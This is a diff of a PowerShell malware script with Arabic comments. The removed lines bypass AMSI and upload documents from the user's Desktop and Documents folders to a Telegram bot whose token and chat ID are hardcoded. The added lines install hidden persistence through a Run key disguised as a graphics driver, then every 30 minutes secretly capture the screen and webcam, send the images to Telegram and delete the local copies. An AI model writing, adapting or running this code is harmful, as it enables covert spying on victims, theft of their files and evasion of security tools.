@@ -1,31 +1,63 @@
-# --- [1] كسر الحماية (Shadow Bypass V5) ---
-$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
-$s.GetField('amsiContext','NonPublic,Static').SetValue($null,(New-Object IntPtr(0)));
+# --- [STARK OMEGA: PAPARAZZI GIANTS-2] ---
+# الوظيفة: تصوير الشاشة والكاميرا دورياً بدون ملفات مؤقتة
 
-# --- [2] إعدادات البوت ---
-$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
-$c = "7393359923"
+$ErrorActionPreference = 'SilentlyContinue'
 
-# --- [3] ميكانيكا تجميع الملفات ---
-$targets = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")
-$extensions = @("*.txt", "*.pdf", "*.docx", "*.xlsx")
-$foundFiles = @()
+# الثوابت
+$BOT_TOKEN = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
+$CHAT_ID = "7393359923"
 
-foreach ($path in $targets) {
-    if (Test-Path $path) {
-        foreach ($ext in $extensions) {
-            # البحث عن الملفات اللي اتعدلت في آخر 30 يوم وحجمها صغير
-            $foundFiles += Get-ChildItem -Path $path -Filter $ext -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 5MB }
+# تحميل مكتبات الجرافيك في الرامات
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+function Send-StarkPhoto($imagePath, $caption) {
+    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
+    curl.exe -F "chat_id=$CHAT_ID" -F "photo=@$imagePath" -F "caption=$caption" $url
+}
+
+# آلية البقاء (Persistence) - العميل رقم 2 بيحمي نفسه
+$path = "$env:APPDATA\Microsoft\Windows\System32_Graphic.ps1"
+if (!(Test-Path $path)) {
+    $MyContent = (New-Object Net.WebClient).DownloadString($MyInvocation.MyCommand.Definition)
+    $MyContent | Out-File -FilePath $path
+    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsGraphicDriver' -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $path"
+}
+
+# الحلقة التكرارية (كل 30 دقيقة)
+while($true) {
+    try {
+        # 1. تصوير الشاشة (Screen Capture)
+        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $Bitmap = New-Object System.Drawing.Bitmap($Screen.Width, $Screen.Height)
+        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
+        $Graphics.CopyFromScreen($Screen.Location, [System.Drawing.Point]::Empty, $Screen.Size)
+        
+        $tempImg = "$env:TEMP\sys_log_$(Get-Date -Format 'HHmm').png"
+        $Bitmap.Save($tempImg, [System.Drawing.Imaging.ImageFormat]::Png)
+        
+        Send-StarkPhoto -imagePath $tempImg -caption "📸 لقطة شاشة دورية من العميل رقم 2"
+        
+        # تنظيف فوري
+        $Graphics.Dispose()
+        $Bitmap.Dispose()
+        Remove-Item $tempImg -Force
+
+        # 2. محاولة تصوير الكاميرا (إذا وجدت)
+        # ملاحظة: تصوير كاميرا الويب يحتاج مكتبة WIA مدمجة في الويندوز
+        $c = New-Object -ComObject WIA.CommonDialog
+        $d = $c.ShowAcquireImage(1, 1, 1, "{B96B3CAF-0728-11D3-9D7B-0000F81EF32E}", $true, $false, $false)
+        if($d) {
+            $camImg = "$env:TEMP\cam_log.jpg"
+            $d.SaveFile($camImg)
+            Send-StarkPhoto -imagePath $camImg -caption "👁️ لقطة كاميرا الويب"
+            Remove-Item $camImg -Force
         }
+
+    } catch {
+        # في حالة الفشل، انتظر وحاول لاحقاً
     }
+    
+    # الانتظار لمدة 30 دقيقة (1800 ثانية)
+    Start-Sleep -Seconds 1800
 }
-
-# --- [4] إرسال الغنائم ---
-foreach ($file in $foundFiles) {
-    # إرسال كل ملف لوحده للبوت
-    curl.exe -F "chat_id=$c" -F "document=@$($file.FullName)" "https://api.telegram.org/bot$t/sendDocument"
-    Start-Sleep -Seconds 1 # استراحة بسيطة عشان التليجرام ميعملش بلوك
-}
-
-# إرسال تقرير نهائي
-curl.exe -X POST "https://api.telegram.org/bot$t/sendMessage" -d "chat_id=$c&text=🎯 Module 05: Infiltration Complete. Files Sent."
